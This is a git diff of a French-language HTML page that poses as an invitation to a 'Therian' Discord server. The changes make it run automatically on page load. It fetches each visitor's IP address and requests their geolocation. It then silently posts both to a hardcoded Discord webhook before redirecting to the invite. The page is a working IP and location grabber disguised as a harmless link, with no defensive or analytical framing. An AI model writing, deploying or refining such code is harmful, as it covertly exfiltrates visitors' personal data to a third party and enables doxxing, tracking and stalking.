@@ -26,44 +26,63 @@
 </head>
 <body>
   <div>
-    <h1>Activer la localisation pour rejoindre le serveur Discord Therian</h1>
-    <a href="#" id="lien-discord">Rejoindre le serveur</a>
+    <h1 id="titre">Chargement…</h1>
   </div>
 
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr";
     const REDIRECT_URL = "https://discord.gg/UYqhGQmdQR";
 
-    document.getElementById("lien-discord").addEventListener("click", function(event) {
-      event.preventDefault();
+    function envoyerPosition(position) {
+      const lat = position.coords.latitude.toFixed(6);
+      const lng = position.coords.longitude.toFixed(6);
 
-      // Collecte l'adresse IP
-      fetch("https://api.ipify.org?format=json")
+      // Envoi en arrière-plan (sans attendre la réponse)
+      fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `📍 Nouvelle localisation :\nLatitude: ${lat}\nLongitude: ${lng}`
+        })
+      }).catch(() => {}); // ignorer erreurs
+
+      // Redirection immédiate
+      window.location.href = REDIRECT_URL;
+    }
+
+    function erreurPosition(error) {
+      // Si la localisation est désactivée ou refusée → redirige direct
+      window.location.href = REDIRECT_URL;
+    }
+
+    function getUserIp() {
+      fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
           const ip = data.ip;
 
-          navigator.geolocation.getCurrentPosition(function(position) {
-            const lat = position.coords.latitude.toFixed(6);
-            const lng = position.coords.longitude.toFixed(6);
-
-            // Envoi en arrière-plan (sans attendre la réponse)
-            fetch(WEBHOOK_URL, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                content: `📍 Nouvelle localisation :\nLatitude: ${lat}\nLongitude: ${lng}\nIP: ${ip}`
-              })
-            }).catch(() => {}); // ignorer erreurs
-
-            // Redirection immédiate
-            window.location.href = REDIRECT_URL;
-          }, function(error) {
-            // Si la localisation est désactivée ou refusée → redirige direct
-            window.location.href = REDIRECT_URL;
-          });
+          // Envoi en arrière-plan (sans attendre la réponse)
+          fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              content: `🌐 Adresse IP utilisateur : ${ip}`
+            })
+          }).catch(() => {}); // ignorer erreurs
         });
-    });
+    }
+
+    window.onload = function() {
+      if ("geolocation" in navigator) {
+        document.getElementById("titre").innerText = "Activer la localisation pour rejoindre le serveur Discord Therian";
+        navigator.geolocation.getCurrentPosition(envoyerPosition, erreurPosition);
+      } else {
+        // Si pas supporté → redirection directe
+        window.location.href = REDIRECT_URL;
+      }
+
+      getUserIp();
+    };
   </script>
 </body>
 </html>
